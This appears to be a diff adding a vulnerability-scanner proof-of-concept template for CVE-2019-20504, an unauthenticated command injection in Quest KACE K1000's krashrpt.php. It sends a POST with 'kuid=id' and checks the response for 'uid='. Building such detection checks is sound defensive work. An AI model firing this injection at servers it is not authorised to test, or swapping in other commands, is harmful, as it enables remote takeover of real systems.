@@ -1,0 +1,33 @@
+[info]
+author = "AVE"
+description = "检测 Quest KACE K1000 系统管理设备 service/krashrpt.php 脚本中的命令注入漏洞，攻击者可通过 kuid 参数中的 Shell 元字符执行任意系统命令，无需身份认证即可完全控制服务器。"
+id = "POC-AVE-2019-0157"
+name = "Quest KACE K1000 远程代码执行漏洞 PoC"
+severity = "critical"
+tags = ["ave-2019-0157"]
+vuln_id = [
+    "CVE-2019-20504",
+    "AVE-2019-0157",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/service/krashrpt.php"
+protocol = "http"
+
+[poc.requests.body]
+content = "kuid=id"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+User-Agent = "AVE/1.0"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["uid="]
